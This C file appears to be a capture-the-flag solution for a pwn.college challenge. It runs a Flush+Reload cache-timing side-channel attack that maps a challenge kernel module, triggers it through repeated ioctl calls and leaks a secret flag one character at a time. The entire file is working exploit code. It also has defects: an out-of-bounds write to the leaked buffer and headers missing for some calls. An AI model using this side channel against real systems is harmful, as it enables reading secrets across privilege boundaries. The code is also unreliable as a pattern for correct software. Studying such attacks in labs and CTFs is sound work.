#define _GNU_SOURCE

#include <sys/signal.h>
#include <sys/prctl.h>
#include <sys/mman.h>

#include <x86intrin.h>
#include <inttypes.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sched.h>

#define PAGESIZE 0x1000

static size_t threshold = 0;
int leaked_chars = 0;
char* mem;

int flush_reload_t(void *ptr) {
    uint64_t start, end, junk;
    uint32_t tsc;

    start = __rdtscp(&tsc);
    _mm_lfence();
    junk = *(volatile uint64_t *)ptr;
    _mm_lfence();
    end = __rdtscp(&tsc);
    _mm_mfence();
    _mm_clflush(ptr);

    return (int)(end - start);
}

int flush_reload(void *ptr) {
    return flush_reload_t(ptr) < threshold;
}

int reload_t(void *ptr) {
    uint64_t start, end, junk;
    uint32_t tsc;

    start = __rdtscp(&tsc);
    _mm_lfence();
    junk = *(volatile uint64_t *)ptr;
    _mm_lfence();
    end = __rdtscp(&tsc);
    _mm_mfence();

    return (int)(end - start);
}

void flush_channel() {
    for(int i = 0; i < 256; i++) {
        _mm_clflush(mem + i * PAGESIZE);
    }
}

void get_leaks(char *leaked, int index) {
    for(int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255; // prevent stride prefetcher from screwing with our results
        if(flush_reload(mem + mix_i * PAGESIZE)) {
            if((mix_i != '\0' && mix_i != ' ') && leaked[index] == ' ') {
                leaked[index] = mix_i;
                leaked_chars++;
                printf("leaked: %s\n", leaked);
            }
        }
    }
}

size_t detect_flush_reload_threshold() {
    size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
    size_t ptr[16];

    reload_t(ptr);

    for (i = 0; i < count; i++) {
        reload_time += reload_t(ptr);
    }
    for (i = 0; i < count; i++) {
        flush_reload_time += flush_reload_t(ptr);
    }
    reload_time /= count;
    flush_reload_time /= count;

    return (flush_reload_time + reload_time * 2) / 3;
}

void pin_cpu(int cpu) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
    sched_setaffinity(0, sizeof(my_set), &my_set);
}

int main(void)
{
    pin_cpu(1);

    char *prefix = "FLAG: ";
    int prefix_len = strlen(prefix);

    // replace with actual flag length
    int flag_len = 21;

    threshold = detect_flush_reload_threshold();
    printf("threshold: %ld\n", threshold);

    // open and mmap kernel module
    int fd = open("/proc/pwncollege", O_RDWR);
    printf("kmod fd: %d\n", fd);

    mem = mmap(0, 256*0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
    mem[1] = 1;

    // setup results buffer
    char leaked[flag_len];
    memset(leaked, ' ', sizeof(leaked));
    leaked[flag_len] = 0;

    // flush shared mem to prep for flush & reload
    flush_channel();

    if (fork() == 0) {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        pin_cpu(0);
        while(1) { }
    }

    int i = 0;
    while (leaked_chars < flag_len) {
        i = (i + 1) % flag_len;
        int target = i + prefix_len;
        if (leaked[i] == ' ') {
            for (int j = 0; j < 0x10; j++) {
                mem[0] = target;
                ioctl(fd, 1337);
            }
            get_leaks(leaked, i);
        }
    }

    close(fd);
    return 0;
}
